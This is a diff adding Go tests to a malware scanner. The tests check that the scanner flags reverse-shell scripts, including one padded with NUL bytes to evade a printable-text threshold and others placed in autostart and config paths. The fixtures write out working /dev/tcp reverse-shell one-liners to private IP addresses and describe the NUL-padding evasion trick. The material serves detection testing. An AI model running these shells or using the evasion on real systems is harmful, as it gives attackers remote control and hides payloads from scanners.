@@ -903,3 +903,72 @@ func BenchmarkScanMediaAssets_NoFalseTriggers(b *testing.B) {
 		}
 	}
 }
+
+func TestCheckAllSuspiciousScriptContent_NULPaddingExecutableBypass(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Construct a script with 30% NUL-byte padding to drop printable ASCII well below the 85% threshold.
+	// Attackers pad scripts with NUL bytes because shells strip NULs during parsing.
+	baseScript := []byte("exec 5<>/dev/tcp/10.10.10.10/4444 && cat <&5 | while read line; do $line 2>&5 >&5; done\n")
+	nulPadding := make([]byte, len(baseScript)/2) // ~33% NUL padding
+	paddedPayload := append(baseScript, nulPadding...)
+
+	paths := []string{
+		"/usr/local/bin/run.sh",
+		"/opt/custom/agent.sh",
+		"/home/victim/.local/bin/runner",
+	}
+
+	for _, p := range paths {
+		// When mode is executable (0755), presence of script attack tokens must force inspection
+		// closing the NUL-padding evasion bypass.
+		matches := scanner.CheckAllSuspiciousScriptContent(p, paddedPayload, nil, cfg, os.FileMode(0755))
+		if len(matches) == 0 {
+			t.Fatalf("expected executable NUL-padded script at %s to be flagged, got 0 matches", p)
+		}
+		found := false
+		for _, m := range matches {
+			if m.Name == "Script_Reverse_Shell_Interactive" {
+				found = true
+				break
+			}
+		}
+		if !found {
+			t.Errorf("expected Script_Reverse_Shell_Interactive in matches, got: %+v", matches)
+		}
+	}
+
+	// Verify that a non-executable file (0644) without valid text ratio is not inspected if outside volatile/web paths
+	nonExecBuf := make([]byte, 1024)
+	copy(nonExecBuf, []byte("some arbitrary text")) // <85% printable because rest is NULs
+	matches := scanner.CheckAllSuspiciousScriptContent("/opt/custom/data.bin", nonExecBuf, nil, cfg, os.FileMode(0644))
+	if len(matches) != 0 {
+		t.Errorf("expected 0 matches for non-executable padded data, got %d", len(matches))
+	}
+}
+
+func TestCheckAllSuspiciousScriptContent_ConfigAndLocalContextGating(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Embedded payload with attack token inside ~/.config and ~/.local paths
+	payload := []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.1.50/8080 0>&1\n")
+
+	testPaths := []string{
+		"/home/user/.config/autostart/login.desktop",
+		"/home/user/.local/share/systemd/user/backdoor.sh",
+		"/root/.config/startup.sh",
+		"/opt/vendor/libexec/monitor.sh",
+		"/usr/local/etc/hook.sh",
+	}
+
+	for _, p := range testPaths {
+		matches := scanner.CheckAllSuspiciousScriptContent(p, payload, nil, cfg, os.FileMode(0755))
+		if len(matches) == 0 {
+			t.Fatalf("expected detection in user-config / opt path %s, got 0 matches", p)
+		}
+		if matches[0].Name != "Script_Reverse_Shell_Interactive" {
+			t.Errorf("path %s: expected Script_Reverse_Shell_Interactive, got %s", p, matches[0].Name)
+		}
+	}
+}
+
